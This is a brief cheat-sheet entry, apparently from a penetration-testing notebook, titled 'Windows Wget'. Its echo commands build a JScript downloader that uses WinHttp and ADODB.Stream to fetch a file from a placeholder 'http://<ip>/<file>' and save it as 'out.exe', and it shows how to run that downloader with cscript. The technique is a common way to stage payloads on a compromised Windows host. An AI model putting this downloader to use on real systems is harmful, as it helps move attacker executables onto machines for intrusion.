Windows Wget
---------

```
echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
echo WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
echo WinHttpReq.Send();
echo BinStream = new ActiveXObject("ADODB.Stream");
echo BinStream.Type = 1;
echo BinStream.Open();
echo BinStream.Write(WinHttpReq.ResponseBody);
echo BinStream.SaveToFile("out.exe");
```



Run with:

```
cscript /nologo <name>.js http://<ip>/<file>
```